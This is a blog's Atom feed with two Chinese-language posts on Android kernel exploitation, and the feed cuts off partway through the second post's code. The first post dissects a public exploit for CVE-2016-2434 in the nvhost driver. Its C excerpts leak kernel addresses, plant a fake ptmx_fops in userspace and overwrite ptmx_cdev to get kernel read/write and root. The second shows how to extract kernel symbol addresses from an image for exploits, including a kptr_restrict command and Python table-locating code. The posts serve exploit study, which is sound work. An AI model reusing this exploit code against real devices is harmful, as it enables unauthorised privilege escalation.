<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ne2der</title>
  <subtitle>Know Yourself</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ne2der.github.io/"/>
  <updated>2017-07-01T06:45:54.336Z</updated>
  <id>http://ne2der.github.io/</id>
  
  <author>
    <name>ne2der</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>EXP学习--CVE-2016-2434</title>
    <link href="http://ne2der.github.io/2017/EXP-cve-2016-2434/"/>
    <id>http://ne2der.github.io/2017/EXP-cve-2016-2434/</id>
    <published>2017-07-01T05:25:28.000Z</published>
    <updated>2017-07-01T06:45:54.336Z</updated>
    
    <content type="html"><![CDATA[<p>编号： CVE-2016-2434<br>EXP： <a href="https://github.com/jianqiangzhao/CVE-2016-2434" target="_blank" rel="external">GitHub</a><br>EXP作者： <a href="https://github.com/jianqiangzhao" target="_blank" rel="external">jianqiangzhao</a></p>
<hr>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这是同样是一个高通驱动中的权限提升漏洞，类似的漏洞还还有cve-2016-2435等几个.<br>代码位置：drivers/video/tegra/host/bus_client.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nvhost_init_error_notifier</span><span class="params">(struct nvhost_channel *ch,</span></span></div><div class="line">        struct nvhost_set_error_notifier *args) &#123;</div><div class="line">    <span class="keyword">void</span> *va;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_buf</span> *<span class="title">dmabuf</span>;</span></div><div class="line">    <span class="keyword">if</span> (!args-&gt;mem) &#123;</div><div class="line">        dev_err(&amp;ch-&gt;dev-&gt;dev, <span class="string">"invalid memory handle\n"</span>);</div><div class="line">        <span class="keyword">return</span> -EINVAL;</div><div class="line">    &#125;</div><div class="line">    dmabuf = dma_buf_get(args-&gt;mem);</div><div class="line">    <span class="keyword">if</span> (ch-&gt;error_notifier_ref)</div><div class="line">        nvhost_free_error_notifiers(ch);</div><div class="line">    <span class="keyword">if</span> (IS_ERR(dmabuf)) &#123;</div><div class="line">        dev_err(&amp;ch-&gt;dev-&gt;dev, <span class="string">"Invalid handle: %d\n"</span>, args-&gt;mem);</div><div class="line">        <span class="keyword">return</span> -EINVAL;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* map handle */</span></div><div class="line">    va = dma_buf_vmap(dmabuf);</div><div class="line">    <span class="keyword">if</span> (!va) &#123;</div><div class="line">        dma_buf_put(dmabuf);</div><div class="line">        dev_err(&amp;ch-&gt;dev-&gt;dev, <span class="string">"Cannot map notifier handle\n"</span>);</div><div class="line">        <span class="keyword">return</span> -ENOMEM;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* set channel notifiers pointer */</span></div><div class="line">    ch-&gt;error_notifier_ref = dmabuf;</div><div class="line">    ch-&gt;error_notifier = va + args-&gt;offset; <span class="comment">// args can be control</span></div><div class="line">    ch-&gt;error_notifier_va = va;</div><div class="line">    <span class="built_in">memset</span>(ch-&gt;error_notifier, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct nvhost_notification)); </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>函数在结尾的地方将ch-&gt;error_notifier置零，ch-&gt;error_notifier的值即va + args-&gt;offset，而args是可以被控制的。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="获取VA"><a href="#获取VA" class="headerlink" title="获取VA"></a>获取VA</h3><p>由于置零的位置不是完全由args控制，还需要一个偏移va，首先需要确定va的值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">0x10000000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, (<span class="keyword">off_t</span>)<span class="number">0</span>);      <span class="comment">// alloc a large mem</span></div><div class="line">	........</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(<span class="built_in">map</span> == MAP_FAILED) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[-] Failed to mmap landing (%d-%s)\n"</span>, errno, strerror(errno));</div><div class="line">		ret = <span class="number">-1</span>;</div><div class="line">		<span class="keyword">goto</span> out;</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[+] landing mmap'ed @ %p\n"</span>, <span class="built_in">map</span>);</div><div class="line">	<span class="built_in">memset</span>(<span class="built_in">map</span>, <span class="number">0xff</span>, <span class="number">0x10000000</span>);      <span class="comment">// set all mem to 0xff</span></div><div class="line"></div><div class="line">	fd = open(<span class="string">"/dev/nvhost-vic"</span>, O_RDONLY);</div><div class="line">	<span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[-] Open nvhost-vic fail (%s - %d)\n"</span>, strerror(errno), errno);</div><div class="line">		ret = <span class="number">-1</span>;</div><div class="line">		<span class="keyword">goto</span> open_vic_out;</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[+] open device nvhost-vic\n"</span>);</div><div class="line"></div><div class="line">	<span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(arg));</div><div class="line">	arg.mem = nvmap_handle;</div><div class="line">	arg.offset = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span> - <span class="number">0xffffff8000000000</span>;      <span class="comment">//adjust address with userspace start</span></div><div class="line">	arg.size = <span class="number">0</span>;</div><div class="line">	cmd = NVHOST_IOCTL_CHANNEL_SET_ERROR_NOTIFIER;</div><div class="line">	ret = ioctl(fd, cmd, &amp;arg);                              <span class="comment">// call vul ioctl </span></div><div class="line">	<span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[-] Ioctl nvhost-vic fail(%s - %d)\n"</span>, strerror(errno), errno);</div><div class="line">		<span class="keyword">goto</span> ioctl_out;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">0x10000000</span>/<span class="number">8</span>; i++) &#123;                        <span class="comment">//find zero offset .aka va</span></div><div class="line">		tmp = *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">map</span> + i);</div><div class="line">		<span class="keyword">if</span>(tmp == <span class="number">0</span>) &#123;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125; </div><div class="line">	&#125;</div><div class="line"></div><div class="line">	va = <span class="number">0xffffff8000000000</span> + i * <span class="number">8</span>;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[+] va position: 0x%lx\n"</span>, va);</div><div class="line">    </div><div class="line">    .........</div></pre></td></tr></table></figure></p>
<p>步骤：</p>
<ul>
<li>1.分配以大段内存，并全部置为ff</li>
<li>2.调用存在漏洞的ioctl，将一部分数据置零</li>
<li>3.查找分配内存中的0，前面部分的数据即为VA</li>
</ul>
<h3 id="控制ptmx-cdev"><a href="#控制ptmx-cdev" class="headerlink" title="控制ptmx_cdev"></a>控制ptmx_cdev</h3><p>由于有PXN的限制，直接将内核函数指针指向用户地址的payload的方法不可行，需要用其他的方法。EXP将内核结构题，ptmx_cdev的地址指向用户态，控制其中的函数指针指向内核中的ROP。由于针对特地设备，内核中关键符号的地址已经hardcode在exp中。<br>(关于如何在内核中定位符号可以查看我之前的文章<a href="http://ne2der.com/2017/get-symbol-from-kernel-img/" target="_blank" rel="external">内核符号获取</a>)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">   .........</div><div class="line">   </div><div class="line">map2 = mmap((<span class="keyword">void</span> *)<span class="number">0x00010000</span>, (<span class="keyword">size_t</span>)<span class="number">0x10000000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED, <span class="number">-1</span>, (<span class="keyword">off_t</span>)<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span>(map2 == MAP_FAILED) &#123;</div><div class="line">	ret = <span class="number">-1</span>;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[-] shellcode mmap failed (%d-%s)\n"</span>, errno, strerror(errno));</div><div class="line">	<span class="keyword">goto</span> ioctl_out;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] prepare fake_ptmx_fops, mmap'ed @ %p.\n"</span>, map2);</div><div class="line"><span class="built_in">memset</span>(map2, <span class="number">0</span>, <span class="number">0x10000000</span>);</div><div class="line"></div><div class="line">fake_ptmx_fops = PTMX_FOPS &amp; <span class="number">0xffffffff</span>;                                         <span class="comment">//fake PTMX_FOPS</span></div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">1</span> * <span class="number">8</span>) = PTMX_LLSEEK;</div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">2</span> * <span class="number">8</span>) = PTMX_READ;</div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">3</span> * <span class="number">8</span>) = PTMX_WRITE;</div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">8</span> * <span class="number">8</span>) = PTMX_POLL;</div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">9</span> * <span class="number">8</span>) = PTMX_IOCTL;</div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">10</span> * <span class="number">8</span>) = COMPAT_PTMX_IOCTL;</div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">12</span> * <span class="number">8</span>) = PTMX_OPEN;</div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">14</span> * <span class="number">8</span>) = PTMX_RELEASE;</div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">17</span> * <span class="number">8</span>) = PTMX_FASYNC;</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] clear ptmx_cdev list first\n"</span>);</div><div class="line"><span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(arg));</div><div class="line">arg.mem = nvmap_handle;</div><div class="line">arg.offset = PTMX_MISC - va + <span class="number">8</span> * <span class="number">10</span>;</div><div class="line">arg.size = <span class="number">0</span>;</div><div class="line">																<span class="comment">//set the high 32 bit of ptmx_fops to zero</span></div><div class="line">cmd = NVHOST_IOCTL_CHANNEL_SET_ERROR_NOTIFIER;                  <span class="comment">//it will point to fake ptmx_fops in userspace</span></div><div class="line">ret = ioctl(fd, cmd, &amp;arg);</div><div class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[-] Ioctl nvhost-vic fail(%s - %d)\n"</span>, strerror(errno), errno);</div><div class="line">	<span class="keyword">goto</span> ioctl_out_2;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] overwrite ptmx_cdev ops\n"</span>);</div><div class="line"><span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(arg));</div><div class="line">arg.mem = nvmap_handle;</div><div class="line">arg.offset = PTMX_MISC - va + <span class="number">8</span> * <span class="number">10</span> - <span class="number">4</span>;</div><div class="line">arg.size = <span class="number">0</span>;</div><div class="line"></div><div class="line">cmd = NVHOST_IOCTL_CHANNEL_SET_ERROR_NOTIFIER;</div><div class="line">ret = ioctl(fd, cmd, &amp;arg);</div><div class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[-] Ioctl nvhost-vic fail(%s - %d)\n"</span>, strerror(errno), errno);</div><div class="line">	<span class="keyword">goto</span> ioctl_out_2;</div><div class="line">&#125;</div><div class="line">   </div><div class="line">   ...........</div></pre></td></tr></table></figure></p>
<p>步骤：</p>
<ul>
<li>1.在用户空间中部署一个伪造的ptmx_fops</li>
<li>2.通过漏洞将内核ptmx_cdev指向用户态的伪造ptmx_fops</li>
<li>3.修改伪造ptmx_fops中某些函数指针，指向内核中的rop，获得内核任意读写能力(这一步不在上面代码中，在使用时部署。在kernel_read_32/kernel_write_32函数中)</li>
</ul>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>提权部分依旧是查找cred并修改，不分析了</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;编号： CVE-2016-2434&lt;br&gt;EXP： &lt;a href=&quot;https://github.com/jianqiangzhao/CVE-2016-2434&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;&lt;br&gt;EXP作者： &lt;a
    
    </summary>
    
      <category term="Android" scheme="http://ne2der.github.io/categories/Android/"/>
    
    
      <category term="CVE" scheme="http://ne2der.github.io/tags/CVE/"/>
    
      <category term="EXP" scheme="http://ne2der.github.io/tags/EXP/"/>
    
  </entry>
  
  <entry>
    <title>get_symbol_from_kernel_img</title>
    <link href="http://ne2der.github.io/2017/get-symbol-from-kernel-img/"/>
    <id>http://ne2der.github.io/2017/get-symbol-from-kernel-img/</id>
    <published>2017-06-26T06:16:52.000Z</published>
    <updated>2017-06-27T07:44:39.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="EXPTECH-Get-symbols-from-Android-kernel-image"><a href="#EXPTECH-Get-symbols-from-Android-kernel-image" class="headerlink" title="[EXPTECH]__Get symbols from Android kernel image"></a>[EXPTECH]__Get symbols from Android kernel image</h1><h2 id="0x0-为什么需要从kernel-image文件提取符号"><a href="#0x0-为什么需要从kernel-image文件提取符号" class="headerlink" title="0x0 为什么需要从kernel image文件提取符号"></a>0x0 为什么需要从kernel image文件提取符号</h2><p>在进行Android内核exp的时候，常常都需要用到内核符号和它们的地址。linux的/proc/kallsyms中可以找到这些符号的名字和地址，但是这些符号在目前的Android系统中都是被kptr_restrict机制block掉的。</p>
<p>代码位置kernel: lib/vsprintf.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'K'</span>:</div><div class="line">		<span class="comment">/*</span></div><div class="line">		 * %pK cannot be used in IRQ context because its test</div><div class="line">		 * for CAP_SYSLOG would be meaningless.</div><div class="line">		 */</div><div class="line">		<span class="keyword">if</span> (kptr_restrict &amp;&amp; (in_irq() || in_serving_softirq() ||</div><div class="line">				      in_nmi())) &#123;</div><div class="line">			<span class="keyword">if</span> (spec.field_width == <span class="number">-1</span>)</div><div class="line">				spec.field_width = default_width;</div><div class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(buf, end, <span class="string">"pK-error"</span>, spec);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> (!((kptr_restrict == <span class="number">0</span>) ||</div><div class="line">		      (kptr_restrict == <span class="number">1</span> &amp;&amp;</div><div class="line">		       has_capability_noaudit(current, CAP_SYSLOG))))  <span class="comment">//when kptr_restrict ==1 ， symbols will be hidden</span></div><div class="line">			ptr = <span class="literal">NULL</span>;</div><div class="line">		<span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>所以，现在读取kallsyms中的内容会发现所有的符号地址都是0，通过下面的命令可以关闭kptr_restrict。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</div></pre></td></tr></table></figure></p>
<p>然而，</p>
<p>这条命令需要root权限，很可能我们是没有root权限的。那么就尝试直接从kernel image中提取符号，并且在N以及N之前的内核中并没有开启KALSR（下个版本就KALSR了），因此，提取到的地址就是符号真实的地址。</p>
<h2 id="0x01-手动定位"><a href="#0x01-手动定位" class="headerlink" title="0x01 手动定位"></a>0x01 手动定位</h2><p>   在学习的过程中发现了<a href="http://bbs.pediy.com/thread-194803.htm" target="_blank" rel="external">android手机内核提取及逆向分析</a>,文章提供了一种手动搜索的符号地址的方法。我测试了几个符号的查找，发现并不是所有的符号字符串都可以在内核镜像文件中查找到。比如，在下图ida中加载的image文件的string窗口中（已经按string排序）可以看到，有sys_close,却没有sys_clone。查了才知道原来符号字符串是压缩存储的。<br>   <img src="/images/stringinimg.png" alt="ida"></p>
<p>   为了提取所有的符号，那么可以模拟kallsyms提取内核符号的过程将符号还原即可。</p>
<h2 id="0x02-分析kallsyms"><a href="#0x02-分析kallsyms" class="headerlink" title="0x02 分析kallsyms"></a>0x02 分析kallsyms</h2><p>代码位置kernel： kernel/kallsyms.c<br>相关的关键函数是kallsyms_lookup_name,这个函数传入一个符号名，返回这个符号的地址<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">kallsyms_lookup_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> namebuf[KSYM_NAME_LEN];</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> off;</div><div class="line"></div><div class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>, off = <span class="number">0</span>; i &lt; kallsyms_num_syms; i++) &#123;</div><div class="line">		off = kallsyms_expand_symbol(off, namebuf, ARRAY_SIZE(namebuf));  <span class="comment">//decompress symbol name</span></div><div class="line"></div><div class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(namebuf, name) == <span class="number">0</span>)</div><div class="line">			<span class="keyword">return</span> kallsyms_addresses[i];      <span class="comment">//return symbol address</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> module_kallsyms_lookup_name(name);   <span class="comment">//try to find symbol in LKM</span></div><div class="line">&#125;</div><div class="line">EXPORT_SYMBOL_GPL(kallsyms_lookup_name);</div></pre></td></tr></table></figure></p>
<p>kalsyms_lookup_name查找符号的步骤是:</p>
<ul>
<li>1.遍历所有的符号（kallsyms_num_syms即内核符号数量）</li>
<li>2.比较是否要查找的符号</li>
<li>3.是 返回kallsyms_addresses中对应的地址，否继续</li>
<li>4.如果遍历完也没找到，尝试查找LKM中的符号</li>
</ul>
<p>从这个函数可以得出有一张存放内核符号地址的表kallsyms_addresses和一张存放内核符号名的表，这两张表的内容的顺序存在对应关系，也就是内核符号名表的第那n个符号对应内核符号地址表的第n个地址。kallsyms_expand_symbol就是用来解析内核符号名表获取符号名的。继续分析，<br>代码位置kernel： kernel/kallsyms.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">kallsyms_expand_symbol</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> off,</span></span></div><div class="line">					   <span class="keyword">char</span> *result, <span class="keyword">size_t</span> maxlen)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> len, skipped_first = <span class="number">0</span>;</div><div class="line">	<span class="keyword">const</span> u8 *tptr, *data;</div><div class="line"></div><div class="line">	<span class="comment">/* Get the compressed symbol length from the first symbol byte. */</span></div><div class="line">	data = &amp;kallsyms_names[off];</div><div class="line">	len = *data;</div><div class="line">	data++;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Update the offset to return the offset for the next symbol on</div><div class="line">	 * the compressed stream.</div><div class="line">	 */</div><div class="line">	off += len + <span class="number">1</span>;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * For every byte on the compressed symbol data, copy the table</div><div class="line">     * entry for that byte.</div><div class="line">	 */</div><div class="line">	<span class="keyword">while</span> (len) &#123;</div><div class="line">		tptr = &amp;kallsyms_token_table[kallsyms_token_index[*data]];</div><div class="line">		data++;</div><div class="line">		len--;</div><div class="line"></div><div class="line">		<span class="keyword">while</span> (*tptr) &#123;</div><div class="line">			<span class="keyword">if</span> (skipped_first) &#123;</div><div class="line">				<span class="keyword">if</span> (maxlen &lt;= <span class="number">1</span>)</div><div class="line">					<span class="keyword">goto</span> tail;</div><div class="line">				*result = *tptr;</div><div class="line">				result++;</div><div class="line">				maxlen--;</div><div class="line">			&#125; <span class="keyword">else</span></div><div class="line">				skipped_first = <span class="number">1</span>;</div><div class="line">			tptr++;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">tail:</div><div class="line">	<span class="keyword">if</span> (maxlen)</div><div class="line">		*result = <span class="string">'\0'</span>;</div><div class="line"></div><div class="line">	<span class="comment">/* Return to offset to the next symbol. */</span></div><div class="line">	<span class="keyword">return</span> off;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>很明显kallsyms_expand_symbol就是用来还原字符串的，函数进行了多次索引。</p>
<p>过程是（以符号_text为例）：</p>
<ul>
<li>1.从kallsyms_names[off]读出第一个字节，值为n，这个字节代表符号名的分片个数（<em>text被分为   <em>__</em></em> ,t,ext共3片存储，最前面还存放一个type信息共4个部分，n为4)</li>
<li>2.kallsyms_names[off]之后的第n个字节的值对应该分片的索引在kallsyms_token_index中的偏移，在kallsyms_token_index中取出这个索引index[n]。</li>
<li>3.index[n]代表这个分片在kallsyms_token_table表中的偏移，这个表中存储的就是分片的实际内容了。以0作为分片的结尾</li>
<li>4.取出所有分片后拼接在一起，就是 symtype(1byte)+symstring(mbyte),取后n个byte就是符号名了</li>
</ul>
<p>画个图好了<br><img src="/images/kallsyms.png" alt="symbol_index"></p>
<h2 id="0x03-代码获取image中的符号"><a href="#0x03-代码获取image中的符号" class="headerlink" title="0x03 代码获取image中的符号"></a>0x03 代码获取image中的符号</h2><p>现在知道如何获取内核符号名以及内核符号地址了，剩下问题就在于如何从Image中定位四张表，在符号地址中有三个连续的符号的地址都是0xffffffc000081000，在kallsyms中可以看到这三个符号如下图<br><img src="/images/magic_81000.png" alt="magic-address"></p>
<p>从image文件中定位，三个连续的ffffffc000081000，即可找到kallsyms_addresses表，从这个位置向前查找到第一个不为0的位置，就是kallsyms_addresses表的首地址。<br><img src="/images/ffffffc000081000.png" alt="magic_address_in_img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">magic_addr = [<span class="string">"00100800c0ffffff00100800c0ffffff00100800c0ffffff"</span>]</div><div class="line">……</div><div class="line">loc = img.find(magic_addr[<span class="number">0</span>].decode(<span class="string">"hex"</span>))</div><div class="line">    <span class="keyword">if</span> loc == <span class="number">-1</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"can not find magic_addr to locate addresses list head"</span></div><div class="line">        <span class="keyword">return</span></div><div class="line">    addresses = struct.unpack_from(<span class="string">"&lt;Q"</span>, img, loc)</div><div class="line">    offset = <span class="number">0</span></div><div class="line"></div><div class="line">    <span class="comment">#find address list start through magic address</span></div><div class="line">    <span class="keyword">while</span> addresses[<span class="number">0</span>]:</div><div class="line">        offset = offset + <span class="number">1</span></div><div class="line">        <span class="keyword">if</span> loc + offset * <span class="number">8</span> &gt;= len(img):</div><div class="line">            <span class="keyword">print</span> <span class="string">"can not find end of addresses list"</span></div><div class="line">            <span class="keyword">return</span></div><div class="line">        addresses = struct.unpack_from(<span class="string">"&lt;Q"</span>, img, loc - offset * <span class="number">8</span>)</div><div class="line">    <span class="comment"># print hex(addresses[0])</span></div><div class="line">    addresses_offset = loc - <span class="number">8</span> * (offset - <span class="number">1</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"addresses list start at offset %x"</span> % addresses_offset</div></pre></td></tr></table></figure>
<p>kallsyms_addresses表结束后，有两个字节存放kallsyms_num_syms,然后依次是kallsym_names ,markers ,kallsym_token_index ,kallsym_token_tables ,各个部分之间通过长度不定的00分割，因此找到一张表的末尾之后，跳过0就是下一张表的首地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> addresses[<span class="number">0</span>] &gt; <span class="number">0xffffffc000000000</span>:</div><div class="line">    offset = offset + <span class="number">1</span></div><div class="line">    <span class="keyword">if</span> loc + offset * <span class="number">8</span> &gt;= len(img):</div><div class="line">        <span class="keyword">print</span> <span class="string">"can not find end of addresses list"</span></div><div class="line">        <span class="keyword">return</span></div><div class="line">    addresses = struct.unpack_from(<span class="string">"&lt;Q"</span>, img, loc + offset * <span class="number">8</span>)</div><div class="line"></div><div class="line"><span class="comment">#skip zero between address_list and sym_num </span></div><div class="line"><span class="keyword">while</span> addresses[<span class="number">0</span>] == <span class="number">0</span>:</div><div class="line">    offset = offset + <span class="number">1</span></div><div class="line">    <span class="keyword">if</span> loc + offset * <span class="number">8</span> &gt;= len(img):</div><div class="line">        <span class="keyword">print</span> <span class="string">"can not find end of addresses list"</span></div><div class="line">        <span 